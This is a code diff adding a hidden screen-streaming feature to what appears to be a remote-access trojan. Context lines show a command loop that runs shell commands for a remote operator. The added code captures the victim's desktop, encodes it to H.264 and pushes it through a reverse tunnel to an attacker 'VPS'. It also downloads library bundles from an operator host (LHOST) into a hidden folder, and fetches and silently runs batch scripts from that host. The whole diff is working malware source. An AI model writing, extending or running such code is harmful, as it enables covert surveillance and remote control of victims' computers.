@@ -654,6 +654,409 @@ def vnc_status() -> bytes:
     return ("\n".join(lines) + "\n").encode() + MARKER
 
 
+# ==================== STREAM2: python-native H.264 streaming ====================
+# UltraVNC-free streaming: DXGI Desktop Duplication capture (dxcam) on Win8+,
+# GDI (ctypes) fallback on Win7/CPU-only; H.264 encode via PyAV with a tiered
+# pick (h264_mf / Media-Foundation HW accel > libx264 universal software >
+# mpeg4); MPEG-TS over TCP 127.0.0.1:25900+id, reverse-tunnelled to the VPS
+# exactly like the VNC stream (see vnc_target_setup.bat). The python-embed
+# runtime has no site-packages, so on first use the wheel bundle is lazily
+# pulled from http://LHOST:8000/stream_bundle_cp<vmaj><vmin>_<arch>.zip into
+# %USERPROFILE%\.cache\stream and imported from there. On dev boxes the
+# site-packages versions are used as-is (no download).
+
+STREAM2_PORT_BASE = 25900      # local TS listener + VPS tunnel port: 25900 + id
+STREAM2_DIR_NAME = "stream"    # under %USERPROFILE%\.cache
+STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS = 1280, 720, 30
+STREAM2_BR_1080P = 4_000_000   # anchor bitrate, scaled by pixel count
+STREAM2_HTTP_PORT = 8000       # bundle server (same port as the VNC files)
+
+_S2 = {"th": None, "stop": threading.Event(), "id": None,
+       "info": {}, "lock": threading.Lock()}
+
+
+class _S2SockWriter:
+    """Socket adapter so PyAV can mux MPEG-TS straight to the viewer."""
+    __slots__ = ("sock",)
+
+    def __init__(self, sock):
+        self.sock = sock
+
+    def write(self, b):
+        self.sock.sendall(b)
+
+
+def _s2_dir() -> str:
+    return os.path.join(_base_dir(), INSTALL_DIR_NAME, STREAM2_DIR_NAME)
+
+
+def _s2_bundle_name() -> str:
+    try:
+        import platform
+        arch = {"amd64": "amd64", "x86": "win32", "arm64": "arm64"}.get(
+            platform.machine().lower())
+        if arch:
+            return "stream_bundle_cp%d%d_%s.zip" % (
+                sys.version_info[0], sys.version_info[1], arch)
+    except Exception:
+        pass
+    return "stream_bundle.zip"
+
+
+def _s2_load_runtime() -> None:
+    """Import av/dxcam/numpy - bundle on embed runtimes, site-packages on dev."""
+    for attempt in (0, 1):
+        try:
+            import av, dxcam, numpy  # noqa: F401
+            return
+        except Exception:
+            if attempt == 1:
+                raise RuntimeError("stream2 deps unavailable (av/dxcam/numpy)")
+        d = _s2_dir()
+        os.makedirs(d, exist_ok=True)
+        hide_path(d)
+        z = os.path.join(d, _s2_bundle_name())
+        if not os.path.isfile(z):
+            url = "http://%s:%d/%s" % (LHOST, STREAM2_HTTP_PORT,
+                                        _s2_bundle_name())
+            try:
+                import urllib.request
+                with urllib.request.urlopen(url, timeout=90) as r, open(z, "wb") as f:
+                    shutil.copyfileobj(r, f)
+            except Exception as e:
+                raise RuntimeError("bundle download failed (%s)" % e)
+        try:
+            import zipfile
+            with zipfile.ZipFile(z) as zf:
+                zf.extractall(d)
+        except Exception as e:
+            raise RuntimeError("bundle extract failed (%s)" % e)
+        for sub in (d, os.path.join(d, "av.libs"),
+                    os.path.join(d, "numpy.libs")):
+            if os.path.isdir(sub):
+                os.add_dll_directory(sub)
+        sys.path.insert(0, d)
+
+
+def _s2_gdi_grab():
+    """Win7/GDI fallback screen capture -> BGR ndarray (ctypes only)."""
+    import ctypes
+    from ctypes import wintypes
+    gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)
+    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
+    if w <= 0 or h <= 0:
+        return None
+    hdc = user32.GetDC(None)
+    mem = gdi32.CreateCompatibleDC(hdc)
+
+    class BITMAPINFOHEADER(ctypes.Structure):
+        _fields_ = [
+            ("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
+            ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
+            ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
+            ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
+            ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
+            ("biClrImportant", wintypes.DWORD),
+        ]
+
+    bmi = BITMAPINFOHEADER()
+    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+    bmi.biWidth, bmi.biHeight = w, -h   # negative height = top-down rows
+    bmi.biPlanes, bmi.biBitCount = 1, 32
+    bits = ctypes.c_void_p()
+    dib = gdi32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
+                                 ctypes.byref(bits), None, 0)
+    if not dib:
+        gdi32.DeleteDC(mem)
+        user32.ReleaseDC(None, hdc)
+        return None
+    gdi32.SelectObject(mem, dib)
+    if not gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):  # SRCCOPY
+        gdi32.DeleteObject(dib)
+        gdi32.DeleteDC(mem)
+        user32.ReleaseDC(None, hdc)
+        return None
+    import numpy as np
+    arr = np.frombuffer(ctypes.string_at(bits, w * h * 4), dtype=np.uint8
+                        ).reshape(h, w, 4)[:, :, :3].copy()  # BGRA -> BGR
+    gdi32.DeleteObject(dib)
+    gdi32.DeleteDC(mem)
+    user32.ReleaseDC(None, hdc)
+    return arr
+
+
+def _s2_capture():
+    """Start the best capture backend -> (grab, stop). Raises on total failure."""
+    import dxcam
+    cam = None
+    try:
+        cam = dxcam.create(output_idx=0, output_color="BGR")
+    except Exception:
+        cam = None
+    if cam is not None:
+        cam.start(target_fps=STREAM2_DEF_FPS, video_mode=True)
+        return cam.get_latest_frame, cam.stop
+    grab = _s2_gdi_grab
+    if grab() is None:
+        raise RuntimeError("no capture backend (DXGI failed, GDI failed)")
+    return grab, (lambda: None)
+
+
+def _s2_bitrate(w, h) -> int:
+    return max(250_000, min(8_000_000,
+                            int(STREAM2_BR_1080P * w * h / (1920 * 1080))))
+
+
+def _s2_make_encoder(name, w, h, fps, br):
+    """Create + open an encoder context by name (with MF-open retry)."""
+    import av
+    from fractions import Fraction
+    c = av.CodecContext.create(name, "w")
+    c.width, c.height = w, h
+    c.time_base = Fraction(1, fps)
+    c.framerate = fps
+    c.pix_fmt = "yuv420p"
+    c.bit_rate = br
+    if name == "libx264":
+        c.options = {"preset": "veryfast", "tune": "zerolatency"}
+    elif name == "h264_mf":
+        c.options = {"usage": "1"}
+    last = None
+    for _ in range(3):
+        try:
+            c.open()
+            return c
+        except Exception as e:
+            last = e
+    raise RuntimeError("encoder open failed: %s" % last)
+
+
+def _s2_pick_encoder(w, h, fps):
+    """Tiered encoder pick: h264_mf (HW) > libx264 (universal) > mpeg4."""
+    import av
+    for name in ("h264_mf", "libx264", "mpeg4"):
+        if name not in av.codec.codecs_available:
+            continue
+        try:
+            _s2_make_encoder(name, w, h, fps, _s2_bitrate(w, h))
+            return name
+        except Exception:
+            continue
+    return None
+
+
+def _s2_run(target_id: str) -> None:
+    """Stream thread: capture -> tiered H.264 -> MPEG-TS on 127.0.0.1:25900+id.
+    Encodes only while a viewer is connected; auto-degrades resolution once if
+    the encoder cannot keep up with the target frame rate."""
+    import av
+    from fractions import Fraction
+    stop = _S2["stop"]
+    info = _S2["info"]
+    port = STREAM2_PORT_BASE + int(target_id)
+    info.update(id=target_id, port=port, started=time.time(), encoder="?",
+                state="starting", w=STREAM2_DEF_W, h=STREAM2_DEF_H,
+                fps=STREAM2_DEF_FPS, viewers=0, bytes=0, frames=0,
+                degraded=False)
+
+    try:
+        _s2_load_runtime()
+        grab, stop_cam = _s2_capture()
+    except Exception as e:
+        info.update(state="failed: %s" % e)
+        return
+
+    try:
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind(("127.0.0.1", port))
+        srv.listen(1)
+        srv.settimeout(0.5)
+    except Exception as e:
+        stop_cam()
+        info.update(state="failed: bind %s" % e)
+        return
+
+    enc_name = _s2_pick_encoder(STREAM2_DEF_W, STREAM2_DEF_H,
+                                STREAM2_DEF_FPS)
+    if not enc_name:
+        stop_cam()
+        srv.close()
+        info.update(state="failed: no usable video encoder in PyAV")
+        return
+    info["encoder"] = enc_name
+    info.update(state="ready - waiting for viewer")
+
+    while not stop.is_set():
+        try:
+            conn, _ = srv.accept()
+        except socket.timeout:
+            continue
+        except OSError:
+            break
+        if conn is None:
+            continue
+        conn.settimeout(2.0)
+        writer = _S2SockWriter(conn)
+        w, h, fps = STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS
+        info.update(state="streaming", viewers=1)
+        viewer_dead = False
+        while not stop.is_set() and not viewer_dead:
+            # (re)build the encoder + TS mux for the current resolution
+            try:
+                enc = _s2_make_encoder(enc_name, w, h, fps, _s2_bitrate(w, h))
+                mux = av.open(writer, "w", format="mpegts")
+                st = mux.add_stream("h264", rate=fps)
+                st.codec_context.extradata = enc.extradata or b""
+            except Exception as e:
+                info.update(state="failed: %s" % e)
+                viewer_dead = True
+                break
+            n_frames = 0
+            n_bytes = 0
+            t0 = time.time()
+            degrade = False
+            try:
+                while not stop.is_set() and not degrade:
+                    frame = grab()
+                    if frame is None:
+                        time.sleep(0.01)
+                        continue
+                    src = av.VideoFrame.from_ndarray(frame, format="bgr24")
+                    scaled = src.reformat(width=w, height=h,
+                                          format="yuv420p",
+                                          interpolation="BICUBIC")
+                    scaled.pts = n_frames * 1_000_000 // fps
+                    scaled.time_base = Fraction(1, 1_000_000)
+                    for pkt in enc.encode(scaled):
+                        pkt.stream = st
+                        mux.mux(pkt)
+                        n_bytes += pkt.size
+                    n_frames += 1
+                    now = time.time()
+                    if now - t0 >= 5.0:
+                        real = n_frames / max(now - t0, 0.001)
+                        info.update(bytes=info.get("bytes", 0) + n_bytes,
+                                    frames=info.get("frames", 0) + n_frames)
+                        if real < fps * 0.6 and not info.get("degraded")\
+                                and w > 640:
+                            w, h, fps = w // 2, h // 2, max(10, fps // 2)
+                            info.update(w=w, h=h, fps=fps, degraded=True)
+                            degrade = True
+                        else:
+                            n_frames, n_bytes, t0 = 0, 0, now
+            except OSError:
+                pass    # viewer disconnected
+            except Exception as e:
+                info.update(state="stream error: %s" % e)
+            try:
+                mux.close()
+            except Exception:
+                pass
+            if not degrade:
+                viewer_dead = True
+        try:
+            conn.close()
+        except OSError:
+            pass
+        info.update(viewers=0, state="ready - waiting for viewer")
+    try:
+        srv.close()
+    except OSError:
+        pass
+    stop_cam()
+    info.update(state="stopped")
+
+
+def deploy_stream2(cmd: str) -> bytes:
+    """'stream2 [id]': start the python-native H.264 stream. id N maps to
+    VPS port 25900+N (reverse tunnel) and local 127.0.0.1:25900+N."""
+    parts = cmd.split()
+    target_id = parts[1] if len(parts) > 1 and parts[1].isdigit() else "1"
+    if not target_id.isdigit():
+        return b"[!] usage: stream2 [id]\n" + MARKER
+    with _S2["lock"]:
+        th = _S2["th"]
+        if th and th.is_alive():
+            return (b"[!] stream2 already running (id " +
+                    str(_S2["info"].get("id", "?")).encode() +
+                    b") - use 'stop stream2' first\n" + MARKER)
+        _S2["stop"].clear()
+        _S2["th"] = threading.Thread(target=_s2_run, args=(target_id,),
+                                     daemon=True, name="s2-" + target_id)
+        _S2["th"].start()
+    p = STREAM2_PORT_BASE + int(target_id)
+    # best-effort: auto-start the reverse tunnel like deploy_vnc does; if the
+    # bat cannot be fetched the streamer still works (tunnel can be added later)
+    tunnel_note = ""
+    try:
+        root = _base_dir()
+        if root:
+            err = _run_hidden(
+                os.path.join(root, "stream2"),
+                "stream2_target_setup.bat",
+                f"http://{LHOST}:8000/stream2_target_setup.bat",
+                target_id,
+            )
+            if err:
+                tunnel_note = " | tunnel: NOT auto-started (%s)" % err
+    except Exception as e:
+        tunnel_note = " | tunnel: NOT auto-started (%s)" % e
+    return ("[+] stream2 started (id %s)%s\n"
+            "    local:  tcp://127.0.0.1:%d\n"
+            "    VPS:    127.0.0.1:%d (needs reverse tunnel, like VNC)\n"
+            "    play:   vlc tcp://<tunnel-end>:<port>\n"
+            % (target_id, tunnel_note, p, p)).encode() + MARKER
+
+
+def stop_stream2(cmd: str) -> bytes:
+    """'stop stream2 [id]': stop the python-native stream thread."""
+    with _S2["lock"]:
+        th = _S2["th"]
+        if not th or not th.is_alive():
+            return b"[*] stream2 not running\n" + MARKER
+        _S2["stop"].set()
+    th.join(timeout=8)
+    with _S2["lock"]:
+        _S2["th"] = None
+    # best-effort: tear down the reverse tunnel + autostart on the target
+    try:
+        root = _base_dir()
+        if root:
+            _run_hidden(
+                os.path.join(root, "stream2"),
+                "stream2_target_stop.bat",
+                f"http://{LHOST}:8000/stream2_target_stop.bat",
+                str(_S2["info"].get("id") or 1),
+            )
+    except Exception:
+        pass
+    return b"[+] stream2 stopped\n" + MARKER
+
+
+def stream2_status() -> bytes:
+    """'stream2 status': report streamer state."""
+    with _S2["lock"]:
+        th = _S2["th"]
+        info = dict(_S2["info"])
+    if not th or not th.is_alive():
+        return b"[*] stream2: not running\n" + MARKER
+    lines = ["[*] stream2: id=%s state=%s" % (info.get("id", "?"),
+                                               info.get("state", "?"))]
+    lines.append("    encoder:  %s" % info.get("encoder", "?"))
+    lines.append("    video:    %sx%s @ %s fps%s" % (
+        info.get("w"), info.get("h"), info.get("fps"),
+        " (degraded)" if info.get("degraded") else ""))
+    lines.append("    viewer:   %s" % ("CONNECTED" if info.get("viewers")
+                                       else "waiting"))
+    lines.append("    uptime:   %ds   bytes: %s" % (
+        int(time.time() - info.get("started", time.time())),
+        info.get("bytes", 0)))
+    lines.append("    stream:   tcp://127.0.0.1:%s" % info.get("port", "?"))
+    return ("\n".join(lines) + "\n").encode() + MARKER
+
+
 def execute_command(cmd: str) -> bytes:
     """Run a shell command and return its output. Handles cd persistently."""
     # Handle cd internally so the working directory persists between commands
@@ -710,7 +1113,14 @@ def connect() -> None:
                     continue
 
                 low = cmd.lower()
-                if (low == "streams" or low.startswith("streams ")
+                if low == "stream2 status" or low == "s2status":
+                    output = stream2_status()
+                elif (low == "stop stream2" or low.startswith("stop stream2 ")
+                        or low == "stopstream2" or low.startswith("stopstream2 ")):
+                    output = stop_stream2(cmd)
+                elif low == "stream2" or low.startswith("stream2 "):
+                    output = deploy_stream2(cmd)
+                elif (low == "streams" or low.startswith("streams ")
                         or low == "list streams" or low.startswith("list streams ")):
                     output = vnc_status()
                 elif (low == "stop stream" or low.startswith("stop stream ")
